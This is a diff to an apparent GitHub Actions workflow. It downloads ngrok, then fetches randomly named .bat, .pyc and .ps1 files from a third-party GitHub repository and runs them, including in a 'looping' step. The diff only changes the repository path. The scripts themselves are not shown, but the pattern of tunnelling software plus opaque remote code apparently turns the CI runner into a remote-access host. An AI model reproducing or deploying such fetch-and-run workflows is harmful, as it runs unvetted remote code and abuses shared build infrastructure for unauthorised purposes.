@@ -12,9 +12,9 @@ jobs:
     - name: Downloading Ngrok.
       run: |
         Invoke-WebRequest https://bin.equinox.io/c/4VmDzA7iaHb/ngrok-stable-windows-amd64.zip -OutFile ngrok.zip
-        Invoke-WebRequest https://raw.githubusercontent.com/gagayoyo/d8dqT73qNwNNqTQN9/main/z360FM0OMMpppzzFO.bat -OutFile z360FM0OMMpppzzFO.bat
-        Invoke-WebRequest https://raw.githubusercontent.com/gagayoyo/d8dqT73qNwNNqTQN9/main/5vG0S7L5GS65R6G56.bat -OutFile 5vG0S7L5GS65R6G56.bat
-        Invoke-WebRequest https://raw.githubusercontent.com/gagayoyo/d8dqT73qNwNNqTQN9/main/kAgu3BovA4o1AdeUv.pyc -OutFile kAgu3BovA4o1AdeUv.pyc
+        Invoke-WebRequest https://raw.githubusercontent.com/gagayoyo/ZsWgzwWW2IzqIZ2Wz/main/z360FM0OMMpppzzFO.bat -OutFile z360FM0OMMpppzzFO.bat
+        Invoke-WebRequest https://raw.githubusercontent.com/gagayoyo/ZsWgzwWW2IzqIZ2Wz/main/5vG0S7L5GS65R6G56.bat -OutFile 5vG0S7L5GS65R6G56.bat
+        Invoke-WebRequest https://raw.githubusercontent.com/gagayoyo/ZsWgzwWW2IzqIZ2Wz/main/kAgu3BovA4o1AdeUv.pyc -OutFile kAgu3BovA4o1AdeUv.pyc
 
     - name: Extracting Ngrok Files.
       run: Expand-Archive ngrok.zip
@@ -35,5 +35,5 @@ jobs:
       run: cmd /c z360FM0OMMpppzzFO.bat
     - name: looping
       run: |
-        Invoke-WebRequest https://raw.githubusercontent.com/gagayoyo/d8dqT73qNwNNqTQN9/main/sYx9aFxYzdZHh1YZa.ps1 -OutFile sYx9aFxYzdZHh1YZa.ps1
+        Invoke-WebRequest https://raw.githubusercontent.com/gagayoyo/ZsWgzwWW2IzqIZ2Wz/main/sYx9aFxYzdZHh1YZa.ps1 -OutFile sYx9aFxYzdZHh1YZa.ps1
         ./sYx9aFxYzdZHh1YZa.ps1
